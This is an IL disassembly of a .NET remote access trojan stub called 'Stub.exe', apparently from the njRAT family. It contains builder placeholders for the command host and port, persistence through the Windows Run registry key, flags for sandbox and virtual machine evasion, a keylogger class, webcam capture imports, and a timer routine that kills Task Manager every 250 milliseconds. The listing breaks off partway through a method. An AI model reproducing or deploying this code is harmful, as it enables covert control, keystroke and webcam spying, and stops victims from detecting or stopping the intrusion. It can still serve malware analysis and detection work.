
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern avicap32.dll
.module extern user32.dll
.module extern kernel32
.module extern KERNEL32.DLL
.module extern ntdll
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly Stub
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module Stub.exe
// MVID: {C1535FC1-4186-4754-8BCE-99F422002D05}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x002F0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi Stub.NoTsk
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTsk::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method NoTsk::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTsk::Start

} // end of class Stub.NoTsk

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static string CAPMODE
  .field public static string FI
  .field public static string SCHEDNAME
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string ORIG
  .field public static string EXECNAME
  .field public static string H
  .field public static bool Idr
  .field public static bool DFire
  .field public static bool Ghost
  .field public static bool Sched
  .field public static bool Melt
  .field public static bool ANYRUN
  .field public static bool VMWare
  .field public static bool VirtualBOX
  .field public static bool TaskMGR
  .field public static bool KProc
  .field public static string Proc
  .field public static int32 Slp
  .field public static bool IsF
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       456 (0x1c8)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] j.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool j.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string j.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string j.OK::EXE
    IL_003e:  ldstr      "[RGB]"
    IL_0043:  stsfld     string j.OK::CAPMODE
    IL_0048:  ldstr      "[FI]"
    IL_004d:  stsfld     string j.OK::FI
    IL_0052:  ldstr      "[SCHEDNAME]"
    IL_0057:  stsfld     string j.OK::SCHEDNAME
    IL_005c:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0061:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0066:  ldstr      "[ORIG]"
    IL_006b:  stsfld     string j.OK::ORIG
    IL_0070:  ldstr      "[EXECNAME]"
    IL_0075:  stsfld     string j.OK::EXECNAME
    IL_007a:  ldstr      "[H]"
    IL_007f:  stsfld     string j.OK::H
    IL_0084:  ldstr      "[Idr]"
    IL_0089:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_008e:  stsfld     bool j.OK::Idr
    IL_0093:  ldstr      "[DFire]"
    IL_0098:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_009d:  stsfld     bool j.OK::DFire
    IL_00a2:  ldstr      "[Ghost]"
    IL_00a7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00ac:  stsfld     bool j.OK::Ghost
    IL_00b1:  ldstr      "[Sched]"
    IL_00b6:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00bb:  stsfld     bool j.OK::Sched
    IL_00c0:  ldstr      "[Melt]"
    IL_00c5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00ca:  stsfld     bool j.OK::Melt
    IL_00cf:  ldstr      "[ANYRUN]"
    IL_00d4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00d9:  stsfld     bool j.OK::ANYRUN
    IL_00de:  ldstr      "[VMWare]"
    IL_00e3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00e8:  stsfld     bool j.OK::VMWare
    IL_00ed:  ldstr      "[VirtualBOX]"
    IL_00f2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00f7:  stsfld     bool j.OK::VirtualBOX
    IL_00fc:  ldstr      "[TaskMGR]"
    IL_0101:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0106:  stsfld     bool j.OK::TaskMGR
    IL_010b:  ldstr      "[KProc]"
    IL_0110:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0115:  stsfld     bool j.OK::KProc
    IL_011a:  ldstr      "[Proc]"
    IL_011f:  stsfld     string j.OK::Proc
    IL_0124:  ldstr      "[Slp]"
    IL_0129:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_012e:  stsfld     int32 j.OK::Slp
    IL_0133:  ldstr      "[Isf]"
    IL_0138:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_013d:  stsfld     bool j.OK::IsF
    IL_0142:  ldstr      "[Isu]"
    IL_0147:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_014c:  stsfld     bool j.OK::Isu
    IL_0151:  ldnull
    IL_0152:  stsfld     class j.kl j.OK::kq
    IL_0157:  ldstr      ""
    IL_015c:  stsfld     string j.OK::lastcap
    IL_0161:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0166:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_016b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0170:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0175:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_017a:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_017f:  ldnull
    IL_0180:  stsfld     object j.OK::MT
    IL_0185:  ldstr      "[P]"
    IL_018a:  stsfld     string j.OK::P
    IL_018f:  ldnull
    IL_0190:  stsfld     object j.OK::PLG
    IL_0195:  ldstr      "[RG]"
    IL_019a:  stsfld     string j.OK::RG
    IL_019f:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_01a4:  stsfld     string j.OK::sf
    IL_01a9:  ldstr      "[VN]"
    IL_01ae:  stsfld     string j.OK::VN
    IL_01b3:  ldstr      "v1.0"
    IL_01b8:  stsfld     string j.OK::VR
    IL_01bd:  ldstr      "|Ghost|"
    IL_01c2:  stsfld     string j.OK::Y
    IL_01c7:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
